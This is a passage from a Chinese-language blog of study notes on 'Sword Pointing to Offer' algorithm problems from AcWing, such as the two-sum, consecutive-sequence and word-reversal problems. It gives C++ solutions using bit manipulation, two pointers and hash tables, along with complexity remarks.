style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">32</span></span></span></span>，所以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>32</mn><mi>n</mi><mo>&gt;</mo><mi>n</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">32n&gt;nlogn</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">32</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span></span></span></span> ，不是严格的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">findNumberAppearingOnce</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; i++) &#123;</span><br><span class="line">      <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) &#123;</span><br><span class="line">        <span class="keyword">if</span> (x &gt;&gt; i &amp; <span class="number">1</span>) cnt++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (cnt % <span class="number">3</span>) &#123;</span><br><span class="line">        res |= <span class="number">1</span> &lt;&lt; i;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="法2-状态机">法2 状态机</h3><p><img src="/2022/11/16/%E7%AE%97%E6%B3%95-%E3%80%8A%E5%89%91%E6%8C%87offer%E3%80%8B%E7%AC%94%E8%AE%B0/image-20221223210809129.png" alt></p><p>根据下面代码可以画出上面的状态机进行验证。</p><p>推导是根据真值表推导出状态转移方程，可参考：<a href="https://www.acwing.com/solution/content/19076/">https://www.acwing.com/solution/content/19076/</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">findNumberAppearingOnce</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ones = <span class="number">0</span>, twos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) &#123;</span><br><span class="line">      ones = (ones ^ x) &amp; ~twos;</span><br><span class="line">      twos = (twos ^ x) &amp; ~ones;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ones;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="和为S的两个数字"><a href="https://www.acwing.com/problem/content/71/">和为S的两个数字</a></h2><p>输入一个数组和一个数字 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span>，在数组中查找两个数，使得它们的和正好是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span>。</p><p>如果有多对数字的和等于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span>，输出任意一对即可。</p><p>你可以认为每组输入中都至少含有一组满足条件的输出。</p><p><strong>数据范围</strong></p><p>数组长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1002</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1002]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1002</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：[1,2,3,4] , sum=7输出：[3,4]</code></pre><h2 id="法1-双指针">法1 双指针</h2><p>时间复杂度：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p>空间复杂度：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findNumbersWithSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">      <span class="keyword">if</span> (nums[i] + nums[j] &lt; target) &#123;</span><br><span class="line">        i++;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[i] + nums[j] &gt; target) &#123;</span><br><span class="line">        j--;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> vector&lt;<span class="type">int</span>&gt;&#123;nums[i], nums[j]&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> vector&lt;<span class="type">int</span>&gt;&#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="法2-hash表快速查找">法2 hash表快速查找</h3><p>时间复杂度：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p>空间复杂度：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">findNumbersWithSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">    unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; hash;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: nums) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!hash[target - x]) &#123;</span><br><span class="line">        hash[x]++;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(&#123;x, target - x&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="和为S的连续正数序列"><a href="https://www.acwing.com/problem/content/72/">和为S的连续正数序列</a></h2><p>输入一个非负整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>，打印出所有和为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> 的连续正数序列（至少含有两个数）。</p><p>例如输入 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>15</mn></mrow><annotation encoding="application/x-tex">15</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">15</span></span></span></span>，由于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>+</mo><mn>2</mn><mo>+</mo><mn>3</mn><mo>+</mo><mn>4</mn><mo>+</mo><mn>5</mn><mo>=</mo><mn>4</mn><mo>+</mo><mn>5</mn><mo>+</mo><mn>6</mn><mo>=</mo><mn>7</mn><mo>+</mo><mn>8</mn><mo>=</mo><mn>15</mn></mrow><annotation encoding="application/x-tex">1+2+3+4+5=4+5+6=7+8=15</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">5</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">15</span></span></span></span>，所以结果打印出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> 个连续序列 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>∼</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">1 \sim 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>∼</mo><mn>6</mn></mrow><annotation encoding="application/x-tex">4 \sim 6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn><mo>∼</mo><mn>8</mn></mrow><annotation encoding="application/x-tex">7 \sim 8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8</span></span></span></span>。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>≤</mo><mi>S</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">0 \le S \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>样例</strong></p><pre><code>输入：15输出：[[1,2,3,4,5],[4,5,6],[7,8]]</code></pre><h3 id="双指针">双指针</h3><blockquote><p>很多情况下，双指针和队列是等价的。<br>由于<strong>queue不支持遍历</strong>，所以这里还是用双指针吧。</p></blockquote><p>分别用i和j表示连续序列的起止位置<br>如果采用暴力方法枚举i和j, 则时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><br>若利用规律: 当j右移时(加数个数增加), i一定也会右移, 则可写出时间复杂度为O(n)的算法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;vector&lt;<span class="type">int</span>&gt; &gt; <span class="built_in">findContinuousSequence</span>(<span class="type">int</span> sum) &#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; path;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">1</span>, s = <span class="number">0</span>; j &lt;= sum / <span class="number">2</span> + <span class="number">1</span>; j++) &#123;</span><br><span class="line">      s += j;</span><br><span class="line">      <span class="keyword">while</span> (s &gt; sum) &#123;</span><br><span class="line">        s -= i;</span><br><span class="line">        i++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (s == sum &amp;&amp; j - i + <span class="number">1</span> &gt;= <span class="number">2</span>) &#123;  <span class="comment">// 至少2个元素</span></span><br><span class="line">        path.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt;= j; k++) path.<span class="built_in">push_back</span>(k);</span><br><span class="line">        res.<span class="built_in">push_back</span>(path);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="翻转单词顺序"><a href="https://www.acwing.com/problem/content/73/">翻转单词顺序</a></h2><p>输入一个英文句子，<strong>单词之间用一个空格隔开，且句首和句尾没有多余空格</strong>。</p><p>翻转句子中单词的顺序，但单词内字符的顺序不变。</p><p>为简单起见，标点符号和普通字母一样处理。</p><p>例如输入字符串<code>&quot;I am a student.&quot;</code>，则输出<code>&quot;student. a am I&quot;</code>。</p><p><strong>数据范围</strong></p><p>输入字符串长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：&quot;I am a student.&quot;输出：&quot;student. a am I&quot;</code></pre><h3 id="两次reverse翻转">两次reverse翻转</h3><ol><li>reverse()函数翻转整体</li><li>快慢指针分割出单词, 再把单词翻转回来</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">string <span class="title">reverseWords</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      <span class="type">int</span> j = i;</span><br><span class="line">      <span class="keyword">while</span> (j &lt; s.<span class="built_in">size</span>() &amp;&amp; s[j] != <span class="string">&#x27; &#x27;</span>) j++;</span><br><span class="line">      <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>() + i, s.<span class="built_in">begin</span>() + j);  <span class="comment">// 前开后闭</span></span><br><span class="line">      i = j;  <span class="comment">// i++后走到空格后</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="改编-翻转单词顺序">改编 翻转单词顺序</h2><p>与上一题不同的是每个单词前后都有数量不定的空格，包括整个句子的前后也可能有一定的空格，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: &quot;  hello   world!  &quot;</span><br><span class="line">输出: &quot;world! hello&quot;</span><br><span class="line">解释: 输入字符串可以在前面或者后面包含多余的空格，但是反转后的字符不能包括。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="代码">代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">string <span class="title">reverseWords</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>, n = s.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> start = <span class="number">0</span>; start &lt; n; start++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (s[start] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (idx != <span class="number">0</span>) s[idx++] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="type">int</span> end = start;</span><br><span class="line">        <span class="keyword">while</span> (end &lt; n &amp;&amp; s[end] != <span class="string">&#x27; &#x27;</span>) s[idx++] = s[end++];</span><br><span class="line">        <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>() + idx - (end - start), s.<span class="built_in">begin</span>() + idx);</span><br><span class="line">        start = end;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    s.<span class="built_in">erase</span>(s.<span class="built_in">begin</span>() + idx, s.<span class="built_in">end</span>());  <span class="comment">// s.erase</span></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="左旋转字符串"><a href="https://www.acwing.com/problem/content/74/">左旋转字符串</a></h2><p>字符串的左旋转操作是把字符串前面的若干个字符转移到字符串的尾部。</p><p>请定义一个函数实现字符串左旋转操作的功能。</p><p>比如输入字符串<code>&quot;abcdefg&quot;</code>和数字 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>，该函数将返回左旋转 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> 位得到的结果<code>&quot;cdefgab&quot;</code>。</p><p><strong>注意：</strong></p><ul><li>数据保证 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 小于等于输入字符串的长度。</li></ul><p><strong>数据范围</strong></p><p>输入字符串长度 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>输入：&quot;abcdefg&quot; , n=2输出：&quot;cdefgab&quot;</code></pre><h3 id="题解-12">题解</h3><p>本质和&quot;翻转句子, 单词不翻转&quot;相同: 把前后两部分看作两个单词。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span 